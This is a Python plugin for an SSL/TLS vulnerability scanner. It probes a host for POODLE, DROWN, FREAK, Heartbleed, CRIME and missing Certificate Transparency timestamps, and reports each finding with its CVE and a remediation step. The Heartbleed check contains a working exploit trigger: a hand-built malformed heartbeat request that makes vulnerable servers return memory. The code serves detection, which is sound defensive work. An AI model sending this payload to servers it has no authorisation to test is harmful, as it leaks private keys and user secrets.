import socket
import ssl
import struct
from .base_plugin import BasePlugin

class SSLVulnPlugin(BasePlugin):
    PLUGIN_ID = "10001"
    PLUGIN_NAME = "SSL/TLS Vulnerability Scanner"
    PLUGIN_FAMILY = "SSL/TLS"
    PLUGIN_VERSION = "1.0"
    PLUGIN_SHORT_KEY = "ssl"
    DESCRIPTION = "Checks for Heartbleed, POODLE, BEAST, DROWN, FREAK, CRIME"
    
    def run(self, progress_callback=None) -> dict:
        """Runs all SSL/TLS vulnerability checks."""
        self.check_poodle()
        self.check_drown()
        self.check_freak()
        self.check_heartbleed()
        self.check_tls_compression()
        self.check_cert_transparency()
        return self.get_results()

    def check_poodle(self):
        """POODLE check: Tests if SSLv3 is enabled.
        
        Python 3.10+ removed ssl.PROTOCOL_SSLv3, so we first try the ssl
        module and then fall back to a raw SSLv3 ClientHello probe.
        """
        # Attempt 1: Use ssl module if SSLv3 constant is available
        if hasattr(ssl, 'PROTOCOL_SSLv3'):
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
                with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                        self.add_finding(
                            title="SSLv3 Enabled (POODLE Vulnerability)",
                            severity="MEDIUM",
                            description="The server supports SSLv3, making it vulnerable to POODLE (Padding Oracle On Downgraded Legacy Encryption) attacks.",
                            evidence="Successfully established connection using SSLv3 protocol.",
                            remediation="Disable SSLv3 on the server and mandate TLS 1.2 or TLS 1.3.",
                            cve_ids=["CVE-2014-3566"],
                            cvss=3.4
                        )
                        return
            except Exception:
                # SSLv3 connection failed — server likely doesn't support it
                return

        # Attempt 2: PROTOCOL_SSLv3 not available (Python 3.10+), use raw socket probe
        self._check_sslv3_raw()

    def _check_sslv3_raw(self):
        """Sends a raw SSLv3 ClientHello to detect SSLv3 support.
        
        If the server responds with a ServerHello (record type 0x16, version
        0x0300), SSLv3 is enabled and the target is vulnerable to POODLE.
        """
        # Minimal SSLv3 ClientHello with one cipher (TLS_RSA_WITH_AES_128_CBC_SHA)
        client_hello = bytearray([
            0x16,              # ContentType: Handshake
            0x03, 0x00,        # Version: SSL 3.0
            0x00, 0x2d,        # Length: 45 bytes of handshake payload
            # Handshake header
            0x01,              # HandshakeType: ClientHello
            0x00, 0x00, 0x29,  # Length: 41 bytes
            0x03, 0x00,        # ClientVersion: SSL 3.0
            # Random (32 bytes of 0x01)
        ] + [0x01] * 32 + [
            0x00,              # Session ID length: 0
            0x00, 0x02,        # Cipher Suites length: 2 bytes (1 cipher)
            0x00, 0x2f,        # TLS_RSA_WITH_AES_128_CBC_SHA
            0x01,              # Compression Methods length: 1
            0x00               # Compression: null
        ])

        try:
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                sock.sendall(client_hello)
                resp = sock.recv(1024)
                # Check for ServerHello: record type 0x16 (Handshake) and version 0x0300 (SSLv3)
                if len(resp) >= 5 and resp[0] == 0x16 and resp[1] == 0x03 and resp[2] == 0x00:
                    self.add_finding(
                        title="SSLv3 Enabled (POODLE Vulnerability)",
                        severity="MEDIUM",
                        description="The server supports SSLv3, making it vulnerable to POODLE (Padding Oracle On Downgraded Legacy Encryption) attacks.",
                        evidence="Server responded with SSLv3 ServerHello to raw SSLv3 ClientHello probe.",
                        remediation="Disable SSLv3 on the server and mandate TLS 1.2 or TLS 1.3.",
                        cve_ids=["CVE-2014-3566"],
                        cvss=3.4
                    )
        except Exception:
            pass

    def check_drown(self):
        """DROWN check: Tests if SSLv2 is enabled.
        
        ssl.PROTOCOL_SSLv2 is unavailable on virtually all modern Python builds,
        so the raw socket probe is the primary detection method.
        """
        # Try ssl module first if the constant exists (very rare)
        if hasattr(ssl, 'PROTOCOL_SSLv2'):
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_SSLv2)
                with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                        self._add_drown_finding()
                        return
            except Exception:
                pass

        # Primary approach: raw SSLv2 Client Hello probe
        self._check_ssl2_raw()

    def _check_ssl2_raw(self):
        # Raw SSLv2 Client Hello
        ssl2_client_hello = bytearray([
            0x80, 0x2c,        # Record length (44 bytes)
            0x01,              # Client Hello
            0x00, 0x02,        # SSL 2.0 version
            0x00, 0x03,        # Cipher spec length (3 bytes)
            0x00, 0x00,        # Session ID length (0)
            0x00, 0x20,        # Challenge length (32 bytes)
            # Cipher spec: SSL_CK_RC4_128_WITH_MD5
            0x01, 0x00, 0x80,
            # Challenge (32 bytes of 0x01)
        ] + [0x01] * 32)
        
        try:
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                sock.sendall(ssl2_client_hello)
                resp = sock.recv(1024)
                # If server responds with Server Hello (starts with Server Hello code or similar)
                if len(resp) > 2 and resp[2] == 0x04: # SSLv2 Server Hello
                    self._add_drown_finding()
        except Exception:
            pass

    def _add_drown_finding(self):
        self.add_finding(
            title="SSLv2 Enabled (DROWN Vulnerability)",
            severity="MEDIUM",
            description="The server supports SSLv2, exposing it to DROWN (Decrypting RSA with Obsolete and Weakened eNcription) attacks.",
            evidence="Server responded to SSLv2 protocol negotiation.",
            remediation="Completely disable SSLv2 and SSLv3 protocols on the server.",
            cve_ids=["CVE-2016-0800"],
            cvss=5.9
        )

    def check_freak(self):
        """FREAK check: Tests if weak export-grade ciphers are accepted.
        
        Modern Python/OpenSSL may refuse to set export ciphers in an SSLContext.
        We first try the ssl module approach, then fall back to a raw TLS
        ClientHello offering only export-grade cipher suites.
        """
        # Attempt 1: Try using ssl module with export ciphers
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            # Modern OpenSSL will raise ssl.SSLError if export ciphers are unavailable
            context.set_ciphers("EXPORT:eNULL:aNULL")
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    self.add_finding(
                        title="Export-Grade Ciphers Supported (FREAK Vulnerability)",
                        severity="MEDIUM",
                        description="The server accepts weak export-grade (512-bit) RSA ciphers, allowing attackers to intercept and decrypt traffic.",
                        evidence=f"Connection established using cipher: {ssock.cipher()[0]}",
                        remediation="Disable export-grade ciphers and require strong cryptographic suites.",
                        cve_ids=["CVE-2015-0204"],
                        cvss=5.0
                    )
                    return
        except (ssl.SSLError, OSError, AttributeError):
            # ssl module couldn't set export ciphers or connection was rejected — expected
            pass

        # Attempt 2: Raw TLS ClientHello offering only export-grade ciphers
        self._check_freak_raw()

    def _check_freak_raw(self):
        """Sends a TLS ClientHello with only export-grade cipher suites.
        
        If the server selects one of these ciphers and returns a ServerHello,
        it is vulnerable to FREAK.
        """
        # Export cipher suite IDs (TLS_RSA_EXPORT_WITH_*)
        export_ciphers = [
            0x00, 0x03,  # TLS_RSA_EXPORT_WITH_RC4_40_MD5
            0x00, 0x06,  # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
            0x00, 0x08,  # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
            0x00, 0x14,  # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
            0x00, 0x17,  # TLS_DH_anon_EXPORT_WITH_RC4_40_MD5
            0x00, 0x19,  # TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
        ]
        cipher_len = len(export_ciphers)

        # Build ClientHello handshake body
        random_bytes = b'\x01' * 32  # 32-byte client random
        session_id = b'\x00'         # session ID length 0
        cipher_suite_bytes = struct.pack('!H', cipher_len) + bytes(export_ciphers)
        compression = b'\x01\x00'    # 1 method: null compression

        client_hello_body = (
            struct.pack('!HH', 0x0301, 0)[:2] +  # ClientVersion: TLS 1.0 (just major.minor)
            b'\x01' +  # placeholder; we'll build properly below
            random_bytes
        )
        # Build properly: version(2) + random(32) + session_id(1) + ciphers(2+N) + compression(2)
        hello_body = (
            b'\x03\x01' +          # Version: TLS 1.0
            random_bytes +         # Random: 32 bytes
            session_id +           # Session ID length: 0
            cipher_suite_bytes +   # Cipher suites
            compression            # Compression methods
        )
        # Handshake header: type=ClientHello(1), 3-byte length
        hello_len = len(hello_body)
        handshake = struct.pack('!B', 1) + struct.pack('!I', hello_len)[1:] + hello_body
        # TLS record header: type=Handshake(0x16), version=TLS1.0, 2-byte length
        record = struct.pack('!BHH', 0x16, 0x0301, len(handshake)) + handshake

        try:
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                sock.sendall(record)
                resp = sock.recv(4096)
                # Check for ServerHello (record type 0x16 = Handshake)
                # A ServerHello means the server accepted one of our export ciphers
                if len(resp) >= 5 and resp[0] == 0x16:
                    # Verify it's not a TLS Alert (handshake type 0x02 = ServerHello inside)
                    # The handshake type is at byte 5 of the record
                    if len(resp) > 5 and resp[5] == 0x02:  # ServerHello
                        self.add_finding(
                            title="Export-Grade Ciphers Supported (FREAK Vulnerability)",
                            severity="MEDIUM",
                            description="The server accepts weak export-grade (512-bit) RSA ciphers, allowing attackers to intercept and decrypt traffic.",
                            evidence="Server accepted export-grade cipher suite in raw TLS ClientHello probe.",
                            remediation="Disable export-grade ciphers and require strong cryptographic suites.",
                            cve_ids=["CVE-2015-0204"],
                            cvss=5.0
                        )
        except Exception:
            pass

    def check_heartbleed(self):
        """Heartbleed check (CVE-2014-0160).
        
        Detection methodology (based on Jared Stafford's original PoC):
        1. Open a raw TCP socket to port 443
        2. Send a TLS ClientHello with the heartbeat extension (extension type 0x000F)
        3. Read the ServerHello and remaining handshake records
        4. Send a malformed TLS Heartbeat Request with a declared payload length (0x4000)
           far exceeding the actual 1-byte payload — this is the Heartbleed trigger
        5. If the server responds with heartbeat response data, memory was leaked
        6. If the server sends a TLS Alert or drops the connection, it is NOT vulnerable
        
        Uses only stdlib: socket + struct. No external dependencies.
        """
        # --- Step 1: Build TLS ClientHello with Heartbeat extension ---
        # This ClientHello advertises the TLS heartbeat extension (RFC 6520)
        # so that a vulnerable server will accept heartbeat messages.
        client_hello = bytearray([
            0x16,              # ContentType: Handshake
            0x03, 0x02,        # Version: TLS 1.1
            0x00, 0xdc,        # Record Length: 220 bytes
            # --- Handshake Header ---
            0x01,              # HandshakeType: ClientHello
            0x00, 0x00, 0xd8,  # Handshake Length: 216 bytes
            0x03, 0x02,        # ClientVersion: TLS 1.1
            # --- Client Random (32 bytes) ---
            0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
            0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
            0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
            0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
            0x00,              # Session ID Length: 0
            # --- Cipher Suites ---
            0x00, 0x66,        # Cipher Suites Length: 102 bytes (51 suites)
            0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
            0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
            0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
            0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
            0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
            0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
            0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
            0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
            0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
            0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
            0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
            0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
            0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
            # --- Compression Methods ---
            0x01,              # Compression Methods Length: 1
            0x00,              # Compression: null
            # --- Extensions ---
            0x00, 0x49,        # Extensions Length: 73 bytes
            # Extension: ec_point_formats
            0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
            # Extension: elliptic_curves
            0x00, 0x0a, 0x00, 0x34, 0x00, 0x32,
            0x00, 0x0e, 0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b,
            0x00, 0x0c, 0x00, 0x18, 0x00, 0x09, 0x00, 0x0a,
            0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06,
            0x00, 0x07, 0x00, 0x14, 0x00, 0x15, 0x00, 0x04,
            0x00, 0x05, 0x00, 0x12, 0x00, 0x13, 0x00, 0x01,
            0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10,
            0x00, 0x11,
            # Extension: heartbeat (type=0x000F) — THIS IS KEY
            # This tells the server we support heartbeat messages
            0x00, 0x0f,        # Extension Type: heartbeat
            0x00, 0x01,        # Extension Length: 1
            0x01               # HeartbeatMode: peer_allowed_to_send (1)
        ])

        # --- Step 4: Malformed Heartbeat Request ---
        # This is the actual exploit payload:
        # - ContentType 0x18 = Heartbeat
        # - Declared payload length 0x4000 (16384 bytes) but only 1 byte of actual payload
        # - A vulnerable server copies 16384 bytes from its memory and sends them back
        heartbeat_request = bytearray([
            0x18,              # ContentType: Heartbeat (24)
            0x03, 0x02,        # Version: TLS 1.1
            0x00, 0x03,        # Record Length: 3 bytes
            0x01,              # HeartbeatMessageType: Request (1)
            0x40, 0x00         # Payload Length: 16384 (MUCH larger than actual data — the exploit)
        ])

        try:
            # --- Step 2: Connect and send ClientHello ---
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, 443))
            sock.sendall(client_hello)

            # --- Step 3: Read server handshake response ---
            # We need to consume the ServerHello and other handshake records
            # before we can send the heartbeat request
            if not self._recv_tls_handshake(sock):
                sock.close()
                return

            # --- Step 4: Send malformed Heartbeat Request ---
            sock.sendall(heartbeat_request)

            # --- Step 5: Check for heartbeat response (memory leak) ---
            vulnerable = self._recv_heartbeat_response(sock)
            sock.close()

            if vulnerable:
                self.add_finding(
                    title="Heartbleed Vulnerability (CVE-2014-0160)",
                    severity="HIGH",
                    description=(
                        "The server is vulnerable to the Heartbleed bug (CVE-2014-0160). "
                        "A malformed TLS Heartbeat request causes the server to leak up to "
                        "64KB of process memory per request, potentially exposing private keys, "
                        "session tokens, passwords, and other sensitive data."
                    ),
                    evidence="Server returned heartbeat response data exceeding the sent payload size.",
                    remediation=(
                        "Upgrade OpenSSL to version 1.0.1g or later. Revoke and re-issue all "
                        "SSL certificates. Rotate all server-side secrets and user passwords."
                    ),
                    cve_ids=["CVE-2014-0160"],
                    cvss=7.5
                )

        except Exception:
            # Connection failed, timed out, or server dropped — not vulnerable
            pass

    def _recv_tls_handshake(self, sock: socket.socket) -> bool:
        """Reads TLS handshake records from the server after ClientHello.
        
        Returns True if we received valid handshake data (ServerHello etc.),
        False if the server sent an alert or closed the connection.
        """
        try:
            while True:
                # Read TLS record header: 5 bytes (type[1] + version[2] + length[2])
                header = self._recv_exact(sock, 5)
                if header is None:
                    return False

                content_type = header[0]
                # Parse record payload length from bytes 3-4
                record_length = struct.unpack('!H', header[3:5])[0]

                # Read the record payload
                payload = self._recv_exact(sock, record_length)
                if payload is None:
                    return False

                # 0x16 = Handshake record (ServerHello, Certificate, etc.)
                if content_type == 0x16:
                    # Check handshake message type in payload
                    # 0x0E = ServerHelloDone — handshake negotiation complete
                    if len(payload) > 0 and payload[0] == 0x0E:
                        return True
                    # Continue reading more handshake records
                    continue

                # 0x15 = Alert — server rejected our ClientHello
                elif content_type == 0x15:
                    return False

                # 0x14 = ChangeCipherSpec — unexpected at this stage
                elif content_type == 0x14:
                    continue

                else:
                    # Unknown record type; keep reading
                    continue

        except Exception:
            return False

    def _recv_heartbeat_response(self, sock: socket.socket) -> bool:
        """Reads the server's response after sending the heartbeat request.
        
        Returns True if the server sends back heartbeat response data
        (meaning it leaked memory — VULNERABLE).
        Returns False if no response, alert, or timeout (NOT vulnerable).
        """
        try:
            # Read TLS record header
            header = self._recv_exact(sock, 5)
            if header is None:
                return False

            content_type = header[0]
            record_length = struct.unpack('!H', header[3:5])[0]

            # ContentType 0x18 = Heartbeat — server is responding with data
            if content_type == 0x18 and record_length > 3:
                # Read the actual heartbeat payload
                payload = self._recv_exact(sock, record_length)
                if payload is not None and len(payload) > 3:
                    # Server leaked memory — VULNERABLE
                    return True

            # ContentType 0x15 = Alert — server properly rejected our request
            # This means the server is patched / not vulnerable
            return False

        except Exception:
            return False

    def _recv_exact(self, sock: socket.socket, length: int) -> bytes:
        """Receives exactly 'length' bytes from a socket.
        
        Returns the bytes or None if the connection drops before
        the full amount is received.
        """
        data = b''
        remaining = length
        while remaining > 0:
            try:
                chunk = sock.recv(remaining)
                if not chunk:
                    return None
                data += chunk
                remaining -= len(chunk)
            except Exception:
                return None
        return data

    def check_tls_compression(self):
        """CRIME check: Check if TLS compression is enabled."""
        try:
            context = ssl.create_default_context()
            # Try to query compression support if available in python ssl
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    # Check compression method
                    comp = ssock.compression()
                    if comp is not None and comp != "none":
                        self.add_finding(
                            title="TLS Compression Enabled (CRIME Vulnerability)",
                            severity="LOW",
                            description="TLS compression is enabled on this server, making it potentially vulnerable to CRIME attack.",
                            evidence=f"TLS Compression method: {comp}",
                            remediation="Disable TLS compression in the web server configuration.",
                            cve_ids=["CVE-2012-4929"],
                            cvss=3.7
                        )
        except Exception:
            pass

    def check_cert_transparency(self):
        """CT Check: Checks if certificate has CT SCT extension."""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((self.host, 443), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    # Simple heuristic: scan binary DER format of cert for CT OID: 1.3.6.1.4.1.11129.2.4.2
                    # (Signed Certificate Timestamp list)
                    ct_oid_bytes = b"\x2b\x06\x01\x04\x01\xd6\x79\x02\x04\x02"
                    if ct_oid_bytes in cert:
                        return
                    
                    self.add_finding(
                        title="Certificate Transparency SCT Missing",
                        severity="INFO",
                        description="The SSL certificate does not contain Signed Certificate Timestamps (SCTs), which is recommended for trust validation.",
                        evidence="CT OID 1.3.6.1.4.1.11129.2.4.2 not found in DER-encoded certificate.",
                        remediation="Request certificate with Certificate Transparency (SCT) enabled from your CA.",
                        cvss=0.0
                    )
        except Exception:
            pass
